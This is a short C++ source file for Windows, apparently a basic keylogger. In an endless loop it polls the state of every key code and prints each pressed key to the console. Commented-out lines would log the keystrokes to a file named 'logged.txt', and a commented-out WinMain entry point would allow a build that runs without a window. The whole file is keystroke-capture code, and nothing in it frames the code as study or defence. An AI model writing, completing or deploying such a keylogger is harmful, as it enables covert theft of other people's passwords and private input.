#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>

#include <iostream>

#include "Utils.h"
#include "CharacterHandler.h"

#define INTERVAL 75

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{
	//std::ofstream file("logged.txt", std::ios::trunc);
	CharacterHandler::initSpecialChars();
	while(true)
	{
		for(unsigned char i = 0; i < 255; i++)
		{
			const SHORT keyState = GetAsyncKeyState(i);
			if (keyState && (keyState ^ 1) == keyState-1) {
				if (utils::isKeyAlphaNum(i)) {
					//file << static_cast<char>(i) << std::endl;
					std::cout << static_cast<char>(i) << std::endl;
				} else
				{
					Character* ptr = CharacterHandler::getCharacterByKeyCode(i);
					if (ptr) {
						//file << CharacterHandler::getCharacterByKeyCode(i) << std::endl;
						std::cout << *CharacterHandler::getCharacterByKeyCode(i) << std::endl;
					}
				}
			}
		}
		//std::this_thread::sleep_for(std::chrono::milliseconds(INTERVAL));
	}
	return 0;
}